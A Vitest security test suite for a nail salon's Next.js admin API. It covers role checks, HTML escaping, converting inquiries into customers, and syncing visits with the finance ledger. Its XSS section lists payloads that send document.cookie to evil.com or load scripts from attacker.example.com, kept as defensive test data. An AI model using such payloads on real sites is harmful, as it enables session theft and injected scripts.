import { describe, it, expect, beforeEach } from 'vitest';
import { NextRequest } from 'next/server';
import { mockCrmStore } from '@/lib/crm/mock-customers';
import {
  formatCustomerRecord,
  sanitizeXss,
  getInquiries,
  getInquiryById,
  updateInquiryStatus,
  logVisit,
  getVisits,
  createCustomer,
} from '@/lib/crm/customers';
import {
  mockStaffStore,
  calculateStaffProductivity,
  getStaffList,
  getStaffById,
  createStaffMember,
  updateStaffRole,
  updateStaffStatus,
} from '@/lib/staff/staff-data';
import {
  canElevateRole,
  canAccessFinance,
  canMutateCMS,
  canAccessRoute,
  isValidRole,
  normalizeRole,
} from '@/lib/auth/roles';

// Route handlers under test
import { GET as getStaffRoute, POST as postStaffRoute } from '@/app/api/admin/staff/route';
import { GET as getStaffByIdRoute, PUT as putStaffRoute } from '@/app/api/admin/staff/[id]/route';
import { PUT as putStaffRoleRoute } from '@/app/api/admin/staff/[id]/role/route';
import { PUT as putStaffStatusRoute } from '@/app/api/admin/staff/[id]/status/route';
import { GET as getStaffProductivityRoute } from '@/app/api/admin/staff/[id]/productivity/route';

import { GET as getInquiriesRoute } from '@/app/api/admin/inquiries/route';
import { GET as getInquiryByIdRoute, PUT as putInquiryRoute } from '@/app/api/admin/inquiries/[id]/route';
import { PUT as putInquiryStatusRoute } from '@/app/api/admin/inquiries/[id]/status/route';

import { GET as getVisitsRoute, POST as postVisitRoute } from '@/app/api/admin/visits/route';
import { GET as getCustomersRoute, POST as postCustomerRoute } from '@/app/api/admin/customers/route';
import {
  GET as getCustomerByIdRoute,
  PUT as putCustomerRoute,
  DELETE as deleteCustomerRoute,
} from '@/app/api/admin/customers/[id]/route';

/**
 * Test helper creating realistic NextRequest instances with configurable cookies
 */
function createAdversarialRequest(
  url: string,
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' = 'GET',
  body?: any,
  options?: {
    role?: 'super_admin' | 'manager' | 'staff' | string;
    authenticated?: boolean;
    cookieOverride?: string;
  }
) {
  const headers: Record<string, string> = {};

  if (options?.cookieOverride !== undefined) {
    headers['Cookie'] = options.cookieOverride;
  } else if (options?.authenticated === false) {
    headers['Cookie'] = 'sb-authenticated=false';
  } else if (options?.role) {
    headers['Cookie'] = `sb-authenticated=true; sb-role=${options.role}; sb-email=${options.role}@glamournails.com.au`;
  }

  if (body) {
    headers['Content-Type'] = 'application/json';
  }

  return new NextRequest(url, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });
}

describe('Adversarial Security, Authorization & Multi-Module Sync Challenger Suite (Milestone 4)', () => {
  beforeEach(() => {
    mockCrmStore.reset();
    mockStaffStore.reset();
  });

  // ==========================================================================
  // Section 1: RBAC Privilege Escalation & Authorization Boundary Attacks
  // ==========================================================================
  describe('1. RBAC Privilege Escalation & Authorization Boundaries', () => {
    it('invariant 1.1: unauthenticated POST /api/admin/staff returns HTTP 401', async () => {
      // 1. Missing cookie entirely
      const reqNoCookie = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff',
        'POST',
        { full_name: 'Attacker Impersonator', phone: '0412 000 999' }
      );
      const resNoCookie = await postStaffRoute(reqNoCookie);
      expect(resNoCookie.status).toBe(401);
      const dataNoCookie = await resNoCookie.json();
      expect(dataNoCookie.success).toBe(false);
      expect(dataNoCookie.error).toContain('Unauthorized');

      // 2. Explicitly unauthenticated cookie (e.g. sb-authenticated=false)
      const reqExplicitFalse = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff',
        'POST',
        { full_name: 'Attacker Impersonator', phone: '0412 000 999' },
        { authenticated: false }
      );
      const resExplicitFalse = await postStaffRoute(reqExplicitFalse);
      expect(resExplicitFalse.status).toBe(401);
    });

    it('invariant 1.2: staff role cannot create staff members (POST /api/admin/staff returns HTTP 403 Forbidden)', async () => {
      const payload = {
        full_name: 'Unauthorized New Hire',
        phone: '0412 888 777',
        role: 'staff',
        employment_type: 'Full-time',
      };

      const reqStaff = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff',
        'POST',
        payload,
        { role: 'staff' }
      );
      const resStaff = await postStaffRoute(reqStaff);
      expect(resStaff.status).toBe(403);
      const dataStaff = await resStaff.json();
      expect(dataStaff.success).toBe(false);
      expect(dataStaff.error).toContain('Forbidden');
      expect(dataStaff.error).toContain('Staff role not permitted');

      // Verify no staff was actually created in the store
      expect(mockStaffStore.staff.some((s) => s.phone === '0412 888 777')).toBe(false);
    });

    it('invariant 1.3: manager role cannot elevate any user to super_admin (PUT /api/admin/staff/[id]/role returns HTTP 403 Forbidden)', async () => {
      const targetStaff = mockStaffStore.staff.find((s) => s.role === 'staff');
      expect(targetStaff).toBeDefined();

      const reqManagerElevate = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${targetStaff!.id}/role`,
        'PUT',
        { role: 'super_admin' },
        { role: 'manager' }
      );

      const resManagerElevate = await putStaffRoleRoute(reqManagerElevate, {
        params: Promise.resolve({ id: targetStaff!.id }),
      });

      expect(resManagerElevate.status).toBe(403);
      const data = await resManagerElevate.json();
      expect(data.success).toBe(false);
      expect(data.error).toContain('Forbidden');

      // Invariant check: target staff role must remain unchanged
      expect(targetStaff!.role).toBe('staff');
    });

    it('invariant 1.4: staff role cannot elevate themselves or any user (PUT /api/admin/staff/[id]/role returns HTTP 403 Forbidden)', async () => {
      const targetStaff = mockStaffStore.staff[2]; // Chloe (staff)

      for (const attemptedRole of ['staff', 'manager', 'super_admin']) {
        const reqStaffChange = createAdversarialRequest(
          `http://localhost:3000/api/admin/staff/${targetStaff.id}/role`,
          'PUT',
          { role: attemptedRole },
          { role: 'staff' }
        );

        const resStaffChange = await putStaffRoleRoute(reqStaffChange, {
          params: Promise.resolve({ id: targetStaff.id }),
        });

        expect(resStaffChange.status).toBe(403);
        const data = await resStaffChange.json();
        expect(data.success).toBe(false);
      }
    });

    it('invariant 1.5: invalid role assignment yields HTTP 400 Bad Request', async () => {
      const targetStaff = mockStaffStore.staff[2];
      const invalidRoles = ['hacker', 'ceo', 'owner', 'root', 'administrator', ''];

      for (const badRole of invalidRoles) {
        const reqBadRole = createAdversarialRequest(
          `http://localhost:3000/api/admin/staff/${targetStaff.id}/role`,
          'PUT',
          { role: badRole },
          { role: 'super_admin' }
        );

        const resBadRole = await putStaffRoleRoute(reqBadRole, {
          params: Promise.resolve({ id: targetStaff.id }),
        });

        expect(resBadRole.status).toBe(400);
      }
    });

    it('invariant 1.6: super_admin can assign any valid role and manager can delegate staff/manager', async () => {
      const targetStaff = mockStaffStore.staff[2];

      // Super admin can elevate to manager
      const req1 = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${targetStaff.id}/role`,
        'PUT',
        { role: 'manager' },
        { role: 'super_admin' }
      );
      const res1 = await putStaffRoleRoute(req1, { params: Promise.resolve({ id: targetStaff.id }) });
      expect(res1.status).toBe(200);
      expect(targetStaff.role).toBe('manager');

      // Manager can delegate back to staff
      const req2 = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${targetStaff.id}/role`,
        'PUT',
        { role: 'staff' },
        { role: 'manager' }
      );
      const res2 = await putStaffRoleRoute(req2, { params: Promise.resolve({ id: targetStaff.id }) });
      expect(res2.status).toBe(200);
      expect(targetStaff.role).toBe('staff');

      // Super admin can elevate to super_admin
      const req3 = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${targetStaff.id}/role`,
        'PUT',
        { role: 'super_admin' },
        { role: 'super_admin' }
      );
      const res3 = await putStaffRoleRoute(req3, { params: Promise.resolve({ id: targetStaff.id }) });
      expect(res3.status).toBe(200);
      expect(targetStaff.role).toBe('super_admin');
    });
  });

  // ==========================================================================
  // Section 2: Stored XSS Attacks & Content Sanitization
  // ==========================================================================
  describe('2. Stored XSS Attacks & HTML Sanitization Defense', () => {
    const maliciousPayloads = [
      '<script>alert(1)</script>',
      '<SCRIPT SRC="https://attacker.example.com/malicious.js"></SCRIPT>',
      '<script>evil()</script>',
      '<script type="text/javascript">document.location="http://evil.com/?c="+document.cookie</script>',
      '<ScRiPt>console.log("XSS Execution")</sCrIpT>',
      'Normal text <script>fetch("http://evil.com")</script> extra notes',
      '<script async defer src="/payload.js"></script>',
      '<script><script>alert("nested")</script></script>',
    ];

    it('invariant 2.1: pure sanitizeXss eliminates raw <script> and </script> tags', () => {
      for (const payload of maliciousPayloads) {
        const sanitized = sanitizeXss(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<SCRIPT');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).not.toContain('</SCRIPT>');
        // Must contain entity escaped representations
        expect(sanitized).toMatch(/&lt;script/i);
      }
    });

    it('invariant 2.2: GET /api/admin/inquiries returns sanitized notes without raw executable code', async () => {
      // Inject multiple adversarial inquiries with XSS payloads into the store
      maliciousPayloads.forEach((payload, idx) => {
        mockCrmStore.consultations.push({
          id: `inq-xss-adversarial-${idx}`,
          customer_id: null,
          customer_name: `Hacker Target ${idx}`,
          phone: `0412 999 00${idx}`,
          email: `hacker${idx}@evil.test`,
          preferred_language: 'en',
          preferred_date: '2026-11-20',
          preferred_time: '10:00',
          service_requested_id: null,
          services_requested: ['Acrylic Extensions'],
          notes: payload,
          status: 'new',
          source: 'web_form',
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        });
      });

      const req = createAdversarialRequest(
        'http://localhost:3000/api/admin/inquiries',
        'GET',
        undefined,
        { role: 'manager' }
      );
      const res = await getInquiriesRoute(req);
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.inquiries.length).toBeGreaterThanOrEqual(maliciousPayloads.length);

      // Verify EVERY inquiry notes field in the response is sanitized
      for (const inq of data.inquiries) {
        if (inq.notes) {
          expect(inq.notes).not.toContain('<script');
          expect(inq.notes).not.toContain('<SCRIPT');
          expect(inq.notes).not.toContain('</script>');
          expect(inq.notes).not.toContain('</SCRIPT>');
        }
      }
    });

    it('invariant 2.3: GET /api/admin/inquiries/[id] and PUT sanitizes notes', async () => {
      const maliciousNote = 'Allergic to acetone <script>alert("pwned")</script> please be careful';
      const inqId = 'inq-xss-single';

      mockCrmStore.consultations.push({
        id: inqId,
        customer_id: null,
        customer_name: 'Vulnerable Inquiry',
        phone: '0412 333 444',
        email: 'test@example.com',
        preferred_language: 'vi',
        preferred_date: '2026-11-22',
        preferred_time: '11:00',
        service_requested_id: null,
        services_requested: [],
        notes: maliciousNote,
        status: 'new',
        source: 'web_form',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      });

      // GET detail route check
      const reqGet = createAdversarialRequest(
        `http://localhost:3000/api/admin/inquiries/${inqId}`,
        'GET',
        undefined,
        { role: 'staff' }
      );
      const resGet = await getInquiryByIdRoute(reqGet, { params: Promise.resolve({ id: inqId }) });
      expect(resGet.status).toBe(200);
      const dataGet = await resGet.json();
      expect(dataGet.inquiry.notes).not.toContain('<script>');
      expect(dataGet.inquiry.notes).toContain('&lt;script&gt;');

      // PUT route update with new malicious note
      const updatedMalicious = 'Updating status with <script>evil()</script>';
      const reqPut = createAdversarialRequest(
        `http://localhost:3000/api/admin/inquiries/${inqId}`,
        'PUT',
        { notes: updatedMalicious },
        { role: 'manager' }
      );
      const resPut = await putInquiryRoute(reqPut, { params: Promise.resolve({ id: inqId }) });
      expect(resPut.status).toBe(200);
      const dataPut = await resPut.json();
      expect(dataPut.inquiry.notes).not.toContain('<script>');
      expect(dataPut.inquiry.notes).toContain('&lt;script&gt;');
    });
  });

  // ==========================================================================
  // Section 3: 1-Click Consultation Conversion
  // ==========================================================================
  describe('3. 1-Click Consultation Conversion & Allergen Extraction', () => {
    it('invariant 3.1: converts consultation inquiry to customer profile and links converted_customer_id', async () => {
      const inqId = 'inq-convert-stress-1';
      mockCrmStore.consultations.push({
        id: inqId,
        customer_id: null,
        customer_name: 'Thảo My Lê',
        phone: '0488 777 666',
        email: 'thaomy.le@example.com.au',
        preferred_language: 'vi',
        preferred_date: '2026-11-25',
        preferred_time: '15:30',
        service_requested_id: null,
        services_requested: ['SNS Dipping Powder', 'Gel Nail Art'],
        notes: 'Customer has severe allergy to acetone and sensitive cuticles',
        status: 'new',
        source: 'web_form',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      });

      const req = createAdversarialRequest(
        `http://localhost:3000/api/admin/inquiries/${inqId}/status`,
        'PUT',
        { status: 'booked', convert_to_customer: true },
        { role: 'manager' }
      );
      const res = await putInquiryStatusRoute(req, { params: Promise.resolve({ id: inqId }) });
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.inquiry.status).toBe('booked');
      expect(data.inquiry.converted_customer_id).toBeDefined();

      const newCustomerId = data.inquiry.converted_customer_id;

      // Verify customer record created in mock store
      const createdCustomer = mockCrmStore.customers.find((c) => c.id === newCustomerId);
      expect(createdCustomer).toBeDefined();
      expect(createdCustomer?.full_name).toBe('Thảo My Lê');
      expect(createdCustomer?.name).toBe('Thảo My Lê');
      expect(createdCustomer?.phone).toBe('0488 777 666');
      expect(createdCustomer?.email).toBe('thaomy.le@example.com.au');
      expect(createdCustomer?.preferred_language).toBe('vi');
      expect(createdCustomer?.is_active).toBe(true);

      // Verify allergy extraction from notes
      expect(createdCustomer?.allergies).toContain('severe allergy to acetone');
      expect(createdCustomer?.allergies_sensitivities).toContain('severe allergy to acetone');

      // Verify initial financial & visit metrics are zero
      expect(createdCustomer?.total_visits).toBe(0);
      expect(createdCustomer?.total_visits_count).toBe(0);
      expect(createdCustomer?.total_spend_cents).toBe(0);
      expect(createdCustomer?.total_spent_aud).toBe(0);
    });

    it('invariant 3.2: conversion does not duplicate customer if phone already matches', async () => {
      // Existing customer in database
      const existingCustomer = mockCrmStore.customers[0];
      const initialCustomerCount = mockCrmStore.customers.length;

      const inqId = 'inq-duplicate-check';
      mockCrmStore.consultations.push({
        id: inqId,
        customer_id: null,
        customer_name: existingCustomer.name,
        phone: existingCustomer.phone, // Same phone
        email: 'repeat.client@example.com',
        preferred_language: 'en',
        preferred_date: '2026-11-26',
        preferred_time: '14:00',
        service_requested_id: null,
        services_requested: ['Manicure'],
        notes: 'Follow-up appointment inquiry',
        status: 'new',
        source: 'web_form',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      });

      const req = createAdversarialRequest(
        `http://localhost:3000/api/admin/inquiries/${inqId}/status`,
        'PUT',
        { status: 'booked', convert_to_customer: true },
        { role: 'manager' }
      );
      const res = await putInquiryStatusRoute(req, { params: Promise.resolve({ id: inqId }) });
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.inquiry.converted_customer_id).toBe(existingCustomer.id);

      // Customer count must NOT increase
      expect(mockCrmStore.customers.length).toBe(initialCustomerCount);
    });
  });

  // ==========================================================================
  // Section 4: Visit-to-Finance Ledger Sync & Currency Invariants
  // ==========================================================================
  describe('4. Visit-to-Finance Ledger Sync & Currency Invariants', () => {
    it('invariant 4.1: logging completed visits with varied payment methods accurately updates customer aggregates and creates matching finance transactions', async () => {
      const testCases = [
        {
          payment_method: 'EFTPOS',
          total_amount_cents: 8500, // $85.00
          description: 'SNS Dip Full Set',
        },
        {
          payment_method: 'Cash',
          total_amount_cents: 12000, // $120.00
          description: 'Acrylic Extensions & 3D Gel Art',
        },
        {
          payment_method: 'Credit Card',
          total_amount_cents: 24550, // $245.50
          description: 'Deluxe Spa Pedicure + Russian Manicure',
        },
        {
          payment_method: 'Direct Debit',
          total_amount_cents: 1, // $0.01 Minimum currency boundary
          description: 'Penny Test',
        },
        {
          payment_method: 'Afterpay',
          total_amount_cents: 99900, // $999.00 High ticket treatment
          description: 'Bridal Party Master Set',
        },
      ];

      const customer = mockCrmStore.customers[0];
      const initialVisits = customer.total_visits_count ?? customer.total_visits;
      const initialSpendCents = customer.total_spend_cents ?? Math.round(customer.total_spent_aud * 100);

      let accumulatedVisits = initialVisits;
      let accumulatedSpendCents = initialSpendCents;

      for (const tc of testCases) {
        // Small delay to test timestamp boundary
        await new Promise((resolve) => setTimeout(resolve, 5));

        const req = createAdversarialRequest(
          'http://localhost:3000/api/admin/visits',
          'POST',
          {
            customer_id: customer.id,
            staff_id: 'stf-003',
            visit_date: '2026-11-16T12:00:00Z',
            services_rendered: [{ name: tc.description, price_cents: tc.total_amount_cents }],
            total_amount_cents: tc.total_amount_cents,
            payment_method: tc.payment_method,
            notes: `Adversarial Sync Test: ${tc.description}`,
          },
          { role: 'manager' }
        );

        const res = await postVisitRoute(req);
        expect(res.status).toBe(201);
        const data = await res.json();
        expect(data.success).toBe(true);
        expect(data.visit_id).toBeDefined();
        expect(data.transaction_id).toBeDefined();

        // 1. Customer aggregate tracking verification
        accumulatedVisits += 1;
        accumulatedSpendCents += tc.total_amount_cents;

        expect(customer.total_visits).toBe(accumulatedVisits);
        expect(customer.total_visits_count).toBe(accumulatedVisits);
        expect(customer.total_spend_cents).toBe(accumulatedSpendCents);
        expect(customer.total_spent_aud).toBe(accumulatedSpendCents / 100);

        // 2. Finance transaction ledger verification
        const tx = mockCrmStore.transactions.find((t) => t.id === data.transaction_id);
        expect(tx).toBeDefined();
        expect(tx?.type).toBe('revenue');
        expect(tx?.category).toBe('Services');
        expect(tx?.amount_cents).toBe(tc.total_amount_cents);
        expect(tx?.amount_aud).toBe(tc.total_amount_cents / 100);
        expect(tx?.payment_method).toBe(tc.payment_method);
        expect(tx?.reference_id).toBe(data.visit_id);
        expect(tx?.customer_id).toBe(customer.id);
        expect(tx?.staff_id).toBe('stf-003');
      }
    });

    it('invariant 4.2: rejects invalid visit requests without customer_id with HTTP 400', async () => {
      const req = createAdversarialRequest(
        'http://localhost:3000/api/admin/visits',
        'POST',
        { total_amount_cents: 5000, payment_method: 'Cash' },
        { role: 'manager' }
      );
      const res = await postVisitRoute(req);
      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.success).toBe(false);
      expect(data.error).toContain('customer_id is required');
    });
  });

  // ==========================================================================
  // Section 5: Staff Productivity Invariant & Historical Retention
  // ==========================================================================
  describe('5. Staff Productivity Invariant & Deactivation Retention', () => {
    it('invariant 5.1: staff deactivation excludes member from active roster while preserving historical productivity', async () => {
      const staffMember = mockStaffStore.staff[1]; // Sarah Jenkins
      const staffId = staffMember.id;

      // Seed 3 historical visits for Sarah Jenkins
      mockCrmStore.visits.push(
        {
          id: 'vis-prod-1',
          customer_id: 'cust-1',
          staff_id: staffId,
          service_id: null,
          visit_date: '2026-11-10T10:00:00Z',
          services_rendered: [{ name: 'Acrylic Full Set', price_cents: 9000 }],
          price_charged_aud: 90.0,
          tip_aud: 10.0,
          total_paid_aud: 100.0,
          total_amount_cents: 10000,
          payment_method: 'EFTPOS',
          notes: '',
          rating: 5,
          photo_urls: [],
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        },
        {
          id: 'vis-prod-2',
          customer_id: 'cust-2',
          staff_id: staffId,
          service_id: null,
          visit_date: '2026-11-12T11:00:00Z',
          services_rendered: [{ name: 'SNS Dipping', price_cents: 7000 }],
          price_charged_aud: 70.0,
          tip_aud: 0,
          total_paid_aud: 70.0,
          total_amount_cents: 7000,
          payment_method: 'Cash',
          notes: '',
          rating: 5,
          photo_urls: [],
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        },
        {
          id: 'vis-prod-3',
          customer_id: 'cust-3',
          staff_id: staffId,
          service_id: null,
          visit_date: '2026-11-14T15:00:00Z',
          services_rendered: [{ name: 'Russian Manicure', price_cents: 8000 }],
          price_charged_aud: 80.0,
          tip_aud: 5.0,
          total_paid_aud: 85.0,
          total_amount_cents: 8500,
          payment_method: 'Credit Card',
          notes: '',
          rating: 5,
          photo_urls: [],
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        }
      );

      // Verify active productivity metrics prior to deactivation
      const initialMetrics = await calculateStaffProductivity(staffId);
      expect(initialMetrics.completed_visits).toBe(3);
      expect(initialMetrics.total_revenue_cents).toBe(25500); // 10000 + 7000 + 8500
      expect(initialMetrics.total_revenue_aud).toBe(255.0);
      expect(initialMetrics.average_ticket_aud).toBe(85.0);

      // Verify active staff roster includes Sarah
      const reqActiveBefore = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff?active=true',
        'GET',
        undefined,
        { role: 'manager' }
      );
      const resActiveBefore = await getStaffRoute(reqActiveBefore);
      const dataActiveBefore = await resActiveBefore.json();
      expect(dataActiveBefore.staff.some((s: any) => s.id === staffId)).toBe(true);

      // DEACTIVATE STAFF MEMBER (PUT /api/admin/staff/[id]/status with is_active = false)
      const reqDeactivate = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${staffId}/status`,
        'PUT',
        { is_active: false },
        { role: 'super_admin' }
      );
      const resDeactivate = await putStaffStatusRoute(reqDeactivate, {
        params: Promise.resolve({ id: staffId }),
      });
      expect(resDeactivate.status).toBe(200);
      expect(staffMember.is_active).toBe(false);

      // INVARIANT CHECK 1: Excluded from active staff roster
      const reqActiveAfter = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff?active=true',
        'GET',
        undefined,
        { role: 'manager' }
      );
      const resActiveAfter = await getStaffRoute(reqActiveAfter);
      const dataActiveAfter = await resActiveAfter.json();
      expect(dataActiveAfter.staff.some((s: any) => s.id === staffId)).toBe(false);

      // INVARIANT CHECK 2: Retained in full directory (with is_active = false)
      const reqAllStaff = createAdversarialRequest(
        'http://localhost:3000/api/admin/staff',
        'GET',
        undefined,
        { role: 'manager' }
      );
      const resAllStaff = await getStaffRoute(reqAllStaff);
      const dataAllStaff = await resAllStaff.json();
      const deactivatedRecord = dataAllStaff.staff.find((s: any) => s.id === staffId);
      expect(deactivatedRecord).toBeDefined();
      expect(deactivatedRecord.is_active).toBe(false);

      // INVARIANT CHECK 3: Historical productivity revenue and visit count are strictly preserved
      const reqProd = createAdversarialRequest(
        `http://localhost:3000/api/admin/staff/${staffId}/productivity`,
        'GET',
        undefined,
        { role: 'manager' }
      );
      const resProd = await getStaffProductivityRoute(reqProd, {
        params: Promise.resolve({ id: staffId }),
      });
      expect(resProd.status).toBe(200);
      const prodData = await resProd.json();
      expect(prodData.staff_id).toBe(staffId);
      expect(prodData.completed_visits).toBe(3);
      expect(prodData.total_revenue_cents).toBe(25500);
      expect(prodData.total_revenue_aud).toBe(255.0);
      expect(prodData.average_ticket_aud).toBe(85.0);
    });
  });
});
